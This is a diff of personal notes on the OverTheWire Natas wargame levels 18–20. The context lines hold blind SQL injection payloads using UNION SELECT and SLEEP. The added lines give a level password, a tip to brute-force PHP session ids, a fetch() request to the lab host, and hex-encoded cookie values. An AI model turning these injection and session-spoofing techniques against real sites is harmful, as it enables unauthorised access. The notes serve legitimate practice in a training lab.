@@ -121,7 +121,9 @@ natas18" UNION SELECT * FROM users WHERE password LIKE "a%" AND SLEEP(1)  #
 natas18" UNION SELECT * FROM users WHERE username="natas18" AND SLEEP(1)  #
 
 Natas 19:
+4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
 
+phpses id is 119
 you can solve this level by spoofing your PHPSESSION, it only goes up to 640, so just
 try all of them
 fetch("http://natas18.natas.labs.overthewire.org/", {
@@ -139,3 +141,12 @@ fetch("http://natas18.natas.labs.overthewire.org/", {
   "method": "GET",
   "mode": "cors"
 });
+
+natas 20:
+
+some cookies:
+3232362d
+3239322d
+3131352d
+3530352d
+32342d
